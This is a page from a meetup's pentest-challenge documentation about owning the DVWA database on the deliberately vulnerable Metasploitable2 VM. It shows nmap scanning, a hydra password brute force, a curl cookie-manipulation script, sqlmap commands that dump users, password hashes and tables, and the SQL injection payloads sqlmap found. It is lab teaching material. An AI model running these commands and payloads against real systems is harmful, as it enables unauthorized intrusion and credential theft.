@@ -1,0 +1,650 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>3.22. Owning the Database with SQLMap &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
+        <link rel="next" title="3.23. PentesterLab From SQL injection to Shell II" href="from_sql_injection_to_shell_II.html"/>
+        <link rel="prev" title="3.21. Google’s XSS Game" href="googles_xss_game.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="virtual_machine_setup.html">3.1. Virtual Machine Setup</a></li>
+<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
+<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
+<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
+<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
+<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">3.22. Owning the Database with SQLMap</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#owning-the-database-reconnaissance">3.22.1. Owning the Database reconnaissance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#owning-the-database-password-cracking">3.22.2. Owning the Database password cracking</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#owning-the-database-cookies">3.22.3. Owning the Database cookies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#owning-the-database-sqlmap">3.22.4. Owning the Database sqlmap</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
+<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
+<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
+<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
+        
+      <li>3.22. Owning the Database with SQLMap</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/challenges/owning_database_with_sqlmap.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="owning-the-database-with-sqlmap">
+<span id="owningdbwithsqlmap"></span><h1>3.22. Owning the Database with SQLMap<a class="headerlink" href="#owning-the-database-with-sqlmap" title="Permalink to this headline">¶</a></h1>
+<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://pentestlab.wordpress.com/2012/11/24/owning-the-database-with-sqlmap/">Owning the Database with SQLMap</a>.</p>
+<p><a class="reference external" href="http://sourceforge.net/projects/metasploitable/files/Metasploitable2/">Metasploitable</a>’s 64-bit Ubuntu 8.04 LTS (Hardy Heron) intentionally insecure VMware VM. <a class="reference external" href="http://r-7.co/Metasploitable2">Metasploitable 2 Exploitability Guide</a> describes the vulnerable services. Remember you can login using msfadmin/msfadmin, then <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-i</span></code> to become root. The DVWA Security page at <a class="reference external" href="http://VULNERABLE/dvwa/security.php">http://VULNERABLE/dvwa/security.php</a> can set the security level to one of low (no protection), medium (inadequate protection), or high (secure).</p>
+<p>See <a class="reference internal" href="virtual_machine_setup.html#metasploitable2setup"><span class="std std-ref">Metasploitable2 Setup - VMware vmdk to VirtualBox and KVM</span></a> for details of settup up and using the vulnerable host.</p>
+<div class="section" id="owning-the-database-reconnaissance">
+<h2>3.22.1. Owning the Database reconnaissance<a class="headerlink" href="#owning-the-database-reconnaissance" title="Permalink to this headline">¶</a></h2>
+<p>Although we are told the URL for the SQL injections, let’s pretend we need to do an <code class="docutils literal"><span class="pre">nmap</span></code> reconnaissance, showing we have a web server on port 80 plus many other ports. In fact with so many ports open a follow-up scan <code class="docutils literal"><span class="pre">nmap</span> <span class="pre">-p</span> <span class="pre">0-65535</span> <span class="pre">$TARGET</span></code> is probably warranted if port 80 doesn’t work.</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$</span> sudo nmap -Pn -sV -O <span class="nv">$TARGET</span>
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="go">Nmap scan report for 192.168.1.102</span>
+<span class="go">Host is up (0.00085s latency).</span>
+<span class="go">Not shown: 977 closed ports</span>
+<span class="go">PORT     STATE SERVICE     VERSION</span>
+<span class="go">21/tcp   open  ftp         vsftpd 2.3.4</span>
+<span class="go">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span>
+<span class="go">23/tcp   open  telnet      Linux telnetd</span>
+<span class="go">25/tcp   open  smtp        Postfix smtpd</span>
+<span class="go">53/tcp   open  domain      ISC BIND 9.4.2</span>
+<span class="go">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
+<span class="go">111/tcp  open  rpcbind     2 (RPC #100000)</span>
+<span class="go">139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span>
+<span class="go">445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)</span>
+<span class="go">512/tcp  open  exec        netkit-rsh rexecd</span>
+<span class="go">513/tcp  open  login?</span>
+<span class="go">514/tcp  open  tcpwrapped</span>
+<span class="go">1099/tcp open  rmiregistry GNU Classpath grmiregistry</span>
+<span class="go">1524/tcp open  shell       Metasploitable root shell</span>
+<span class="go">2049/tcp open  nfs         2-4 (RPC #100003)</span>
+<span class="go">2121/tcp open  ftp         ProFTPD 1.3.1</span>
+<span class="go">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span>
+<span class="go">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span>
+<span class="go">5900/tcp open  vnc         VNC (protocol 3.3)</span>
+<span class="go">6000/tcp open  X11         (access denied)</span>
+<span class="go">6667/tcp open  irc         Unreal ircd</span>
+<span class="go">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span>
+<span class="go">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span>
+<span class="go">MAC Address: 52:54:00:58:F8:A2 (QEMU Virtual NIC)</span>
+<span class="go">Device type: general purpose</span>
+<span class="go">Running: Linux 2.6.X</span>
+<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
+<span class="go">OS details: Linux 2.6.9 - 2.6.33</span>
+<span class="go">Network Distance: 1 hop</span>
+<span class="go">Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 31.50 seconds</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="owning-the-database-password-cracking">
+<h2>3.22.2. Owning the Database password cracking<a class="headerlink" href="#owning-the-database-password-cracking" title="Permalink to this headline">¶</a></h2>
+<p>A little probing around the site came up with a login form at <a class="reference external" href="http://$TARGET/dvwa/login.php">http://$TARGET/dvwa/login.php</a> with a huge “Hint: default username is admin with password password”. Although we already have the username/password, let’s at learn a little by doing a brute force crack of the password. We note the login form fields are username, password, and Login. Unsuccessful logins get the message “Login failed”. There are a number of tools that could be used to crack the form’s password: <a class="reference external" href="http://portswigger.net/burp/">Burp Suite</a>, <cite>hydra</cite>, <a class="reference external" href="http://foofus.net/goons/jmk/medusa/medusa.html">Medusa</a>, and more. We illustrate using <a class="reference external" href="https://github.com/vanhauser-thc/thc-hydra/">hydra</a> to crack the password. (See <a class="reference external" href="http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html">Using Hydra to dictionary-attack web-based login forms</a> for an example.)</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$ #</span> To see the format <span class="k">for</span> http-post-form
+<span class="gp">hacker@kali:~$</span> hydra -U http-post-form
+<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
+<span class="gp">hacker@kali:~$ #</span> Password list
+<span class="gp">hacker@kali:~$</span> zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
+<span class="gp">hacker@kali:~$ #</span> Just try to crack the username <span class="s2">&quot;admin&quot;</span>
+<span class="gp">hacker@kali:~$ hydra $</span>TARGET  http-post-form <span class="se">\</span>
+  <span class="s2">&quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&quot;</span> <span class="se">\</span>
+  -l admin -P rockyou.txt
+<span class="go">Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</span>
+
+<span class="go">Hydra (http://www.thc.org/thc-hydra) starting at 2014-11-16 20:53:24</span>
+<span class="go">[DATA] 16 tasks, 1 server, 14344399 login tries (l:1/p:14344399), ~896524 tries per task</span>
+<span class="go">[DATA] attacking service http-post-form on port 80</span>
+<span class="go">[80][www-form] host: 192.168.1.102   login: admin   password: password</span>
+<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="go">Hydra (http://www.thc.org/thc-hydra) finished at 2014-11-16 20:53:33</span>
+</pre></div>
+</div>
+<p>So now we can login using admin/password. A true pentesting triumph with the subtlety of driving a tank through the front door. From there we see a link <a class="reference external" href="http://$TARGET/dvwa/vulnerabilities/sqli/">http://$TARGET/dvwa/vulnerabilities/sqli/</a> which is our SQL injection target.</p>
+</div>
+<div class="section" id="owning-the-database-cookies">
+<h2>3.22.3. Owning the Database cookies<a class="headerlink" href="#owning-the-database-cookies" title="Permalink to this headline">¶</a></h2>
+<p>The SQL injection is password-protected via a login form. See <a class="reference external" href="http://curl.haxx.se/docs/httpscripting.html#Forms_explained">curl HTML forms explained</a>, <a class="reference external" href="http://curl.haxx.se/docs/httpscripting.html#Cookie_Basics">curl Cookies</a>, and <a class="reference external" href="http://curl.haxx.se/docs/httpscripting.html#Some_login_tricks">curl Web Login</a> for some basic background material. See <a class="reference external" href="http://www.cookiecentral.com/faq/#3.5">What are all those entries in my cookies.txt file?</a> for the Netscape cookie file format.</p>
+<p>Since cookies are required, we login saving the cookies to a file using <code class="docutils literal"><span class="pre">curl</span> <span class="pre">--cookie-jar</span> <span class="pre">FILENAME</span> <span class="pre">...</span></code> and use that to set a COOKIES variable. However, the DVWA Security page at <a class="reference external" href="http://$TARGET/dvwa/security.php">http://$TARGET/dvwa/security.php</a> states that you can set the security level to one of low, medium, or high. The default cookie you get sets it to “high” which appears to disallow SQL injection (see <a class="reference external" href="https://security.stackexchange.com/questions/43294/is-it-possible-to-do-sql-injection-high-level-on-damn-vulnerable-web-app">Is it possible to do SQL injection (HIGH Level) on Damn Vulnerable Web App?</a>). So we’ll change the security cookie to “medium” to allow SQL injection.</p>
+<p>NOTE: <a class="reference external" href="https://www.youtube.com/watch?v=I5nrCCL4LIc">Kali Linux - DVWA - Sql Injection (Low- Medium- High)</a> seems to show what we do below working with security level “high” (with the only difference being <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> option “–string=Surname”). But when you look at the quickly-flashing-by-screen it shows the query <code class="docutils literal"><span class="pre">id=1'</span> <span class="pre">AND</span> <span class="pre">SLEEP(5)</span> <span class="pre">AND</span> <span class="pre">'Bksm'='Bksm&amp;Submit=Submit</span></code> was successful for SQL injection. Feeding that back into the running DVWA you’ll see that doesn’t work at security level “high”. The video did not use the iso we did, rather the DVWA version <a class="reference external" href="https://github.com/RandomStorm/DVWA">RandomStorm/DVWA</a> running on <a class="reference external" href="https://www.apachefriends.org/index.html?ModPagespeed=noscript">XAMPP</a> and perhaps that is the root of the difference.</p>
+<p>A note of warning: when passing a cookie string be very careful about the format. For example, “PHPSESSID=2b27bc2ffbedb87596add46a63bb1a10; security=low” works, but “PHPSESSID=2b27bc2ffbedb87596add46a63bb1a10;security=low” (leaving out the space after “;”) will fail.</p>
+<p>Here is the script you can cut/paste to get a PHPSESSID and security cookie in to shell variable COOKIES:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">SECURITY</span><span class="o">=</span>medium
+<span class="nv">URL_LOGIN</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/dvwa/login.php&quot;</span>
+<span class="nv">URL_SQLI</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/dvwa/vulnerabilities/sqli/&quot;</span>
+<span class="nv">COOKIES_FILE</span><span class="o">=</span>cookies.txt
+cat /dev/null &gt; <span class="nv">$COOKIES_FILE</span>
+
+curl -v --cookie-jar <span class="s2">&quot;</span><span class="nv">$COOKIES_FILE</span><span class="s2">&quot;</span> <span class="se">\</span>
+        --form <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span> <span class="se">\</span>
+        --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="se">\</span>
+        --form <span class="nv">Login</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
+        <span class="nv">$URL_LOGIN</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep Cookie
+
+<span class="c1"># Get the cookies file data into a variable, changing each \n to a space</span>
+<span class="nv">COOKIES</span><span class="o">=</span><span class="k">$(</span>tail -n +5 <span class="nv">$COOKIES_FILE</span> <span class="p">|</span> cut -f6,7 <span class="p">|</span> sed -e <span class="s1">&#39;s/\t/=/;s/$/;/&#39;</span><span class="k">)</span>
+<span class="nv">COOKIES</span><span class="o">=</span><span class="si">${</span><span class="nv">COOKIES</span><span class="p">//</span><span class="s1">$&#39;\n&#39;</span><span class="p">/ </span><span class="si">}</span>
+
+<span class="c1"># Change security cookie to desired value</span>
+<span class="nv">COOKIES</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">COOKIES</span><span class="p">%%security=*</span><span class="si">}</span><span class="s2">security=</span><span class="nv">$SECURITY</span><span class="s2">;</span><span class="si">${</span><span class="nv">COOKIES</span><span class="p">#*security=*;</span><span class="si">}</span><span class="s2">&quot;</span>
+
+<span class="c1"># Test that the cookies are passed</span>
+curl -v --head --cookie <span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> <span class="nv">$URL_SQLI</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep Cookie
+</pre></div>
+</div>
+<p>The output from running this code is:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$</span> <span class="nv">SECURITY</span><span class="o">=</span>medium
+<span class="gp">hacker@kali:~$ URL_LOGIN=&quot;http://$</span>TARGET/dvwa/login.php<span class="s2">&quot;</span>
+<span class="gp">hacker@kali:~$ URL_SQLI=&quot;http://$</span><span class="s2">TARGET/dvwa/vulnerabilities/sqli/&quot;</span>
+<span class="gp">hacker@kali:~$</span> <span class="nv">COOKIES_FILE</span><span class="o">=</span>cookies.txt
+<span class="gp">hacker@kali:~$</span> cat /dev/null &gt; <span class="nv">$COOKIES_FILE</span>
+<span class="gp">hacker@kali:~$</span>
+<span class="gp">hacker@kali:~$</span> curl -v --cookie-jar <span class="s2">&quot;</span><span class="nv">$COOKIES_FILE</span><span class="s2">&quot;</span> <span class="se">\</span>
+&gt;         --form <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span> <span class="se">\</span>
+&gt;         --form <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="se">\</span>
+&gt;         --form <span class="nv">Login</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
+&gt;         <span class="nv">$URL_LOGIN</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep Cookie
+<span class="go">&lt; Set-Cookie: PHPSESSID=5531c5ed9cfe75dd08ecd87c93a5a05b; path=/</span>
+<span class="go">&lt; Set-Cookie: security=medium</span>
+<span class="gp">hacker@kali:~$</span>
+<span class="gp">hacker@kali:~$ #</span> Get the cookies file data into a variable, changing each <span class="se">\n</span> to a space
+<span class="gp">hacker@kali:~$ COOKIES=$</span><span class="o">(</span>tail -n +5 <span class="nv">$COOKIES_FILE</span> <span class="p">|</span> cut -f6,7 <span class="p">|</span> sed -e <span class="s1">&#39;s/\t/=/;s/$/;/&#39;</span><span class="o">)</span>
+<span class="gp">hacker@kali:~$ COOKIES=${COOKIES//$</span><span class="s1">&#39;\n&#39;</span>/ <span class="o">}</span>
+<span class="gp">hacker@kali:~$</span>
+<span class="gp">hacker@kali:~$ #</span> Change security cookie to desired value
+<span class="gp">hacker@kali:~$ COOKIES=&quot;${COOKIES%%security=*}security=$SECURITY;${COOKIES#</span>*security<span class="o">=</span>*<span class="p">;</span><span class="o">}</span><span class="s2">&quot;</span>
+<span class="gp">hacker@kali:~$</span><span class="s2"></span>
+<span class="gp">hacker@kali:~$ #</span><span class="s2"> Test that the cookies are passed</span>
+<span class="gp">hacker@kali:~$</span><span class="s2"> curl -v --head --cookie &quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot; </span><span class="nv">$URL_SQLI</span><span class="s2"> 2&gt;&amp;1 | grep Cookie</span>
+<span class="gp">&gt;</span><span class="s2"> Cookie: PHPSESSID=5531c5ed9cfe75dd08ecd87c93a5a05b; security=medium;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="owning-the-database-sqlmap">
+<h2>3.22.4. Owning the Database sqlmap<a class="headerlink" href="#owning-the-database-sqlmap" title="Permalink to this headline">¶</a></h2>
+<p>Now we have the cookies for <a class="reference external" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">sqlmap</a> to work. Here’s the script we’ll be executing (assuming COOKIES are set from above):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="nv">URL_SQLI</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/dvwa/vulnerabilities/sqli/&quot;</span>
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    --dbs
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    --fingerprint --banner --current-user --is-dba --current-db --hostname
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    --users --passwords --privileges --roles
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    -D dvwa --tables
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    -D dvwa --columns
+
+sqlmap --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span> -u <span class="s2">&quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span><span class="s2">?id=1&amp;Submit=Submit&quot;</span> <span class="se">\</span>
+    --dbms mysql --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
+    -D dvwa --dump
+</pre></div>
+</div>
+<p>And here goes the results of running these commands, showing we have admin access to the database:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<span class="gp">hacker@kali:~$ URL_SQLI=&quot;http://$</span>TARGET/dvwa/vulnerabilities/sqli/<span class="s2">&quot;</span>
+<span class="gp">hacker@kali:~$</span><span class="s2"></span>
+<span class="gp">hacker@kali:~$</span><span class="s2"> sqlmap --cookie=&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot; -u &quot;</span><span class="si">${</span><span class="nv">URL_SQLI</span><span class="si">}</span>?id<span class="o">=</span><span class="m">1</span><span class="p">&amp;</span><span class="nv">Submit</span><span class="o">=</span>Submit<span class="s2">&quot; \</span>
+<span class="s2">&gt;     --batch --output-dir </span><span class="nv">$PWD</span><span class="s2">/sqlmap \</span>
+<span class="s2">&gt;     --dbs</span>
+<span class="go">... SNIP ...</span>
+<span class="go">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+<span class="go">sqlmap identified the following injection points with a total of 41 HTTP(s) requests:</span>
+<span class="go">---</span>
+<span class="go">Place: GET</span>
+<span class="go">Parameter: id</span>
+<span class="go">    Type: boolean-based blind</span>
+<span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause</span>
+<span class="go">    Payload: id=1&#39; AND 5774=5774 AND &#39;CCoS&#39;=&#39;CCoS&amp;Submit=Submit</span>
+
+<span class="go">    Type: error-based</span>
+<span class="go">    Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause</span>
+<span class="go">    Payload: id=1&#39; AND (SELECT 3501 FROM(SELECT COUNT(*),CONCAT(0x71676c7771,(SELECT (CASE WHEN (3501=3501) THEN 1 ELSE 0 END)),0x7169727671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;WEGy&#39;=&#39;WEGy&amp;Submit=Submit</span>
+
+<span class="go">    Type: UNION query</span>
+<span class="go">    Title: MySQL UNION query (NULL) - 2 columns</span>
+<span class="go">    Payload: id=1&#39; UNION ALL SELECT CONCAT(0x71676c7771,0x505a657745466d4f7977,0x7169727671),NULL#&amp;Submit=Submit</span>
+
+<span class="go">    Type: AND/OR time-based blind</span>
+<span class="go">    Title: MySQL &gt; 5.0.11 AND time-based blind</span>
+<span class="go">    Payload: id=1&#39; AND SLEEP(5) AND &#39;OPkw&#39;=&#39;OPkw&amp;Submit=Submit</span>
+<span class="go">---</span>
+<span class="go">[14:56:45] [INFO] the back-end DBMS is MySQL</span>
+<span class="go">web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</span>
+<span class="go">web application technology: PHP 5.2.4, Apache 2.2.8</span>
+<span class="go">back-end DBMS: MySQL 5.0</span>
+<span class="go">[14:56:45] [INFO] fetching database names</span>
+<span class="go">available databases [7]:</span>
+<span class="go">[*] dvwa</span>
+<span class="go">[*] information_schema</span>
+<span class="go">[*] metasploit</span>
+<span class="go">[*] mysql</span>
+<span class="go">[*] owasp10</span>
+<span class="go">[*] tikiwiki</span>
+<span class="go">[*] tikiwiki195</span>
+<span class="go">... SNIP ...</span>
+<span class="gp">hacker@kali:~$</span>
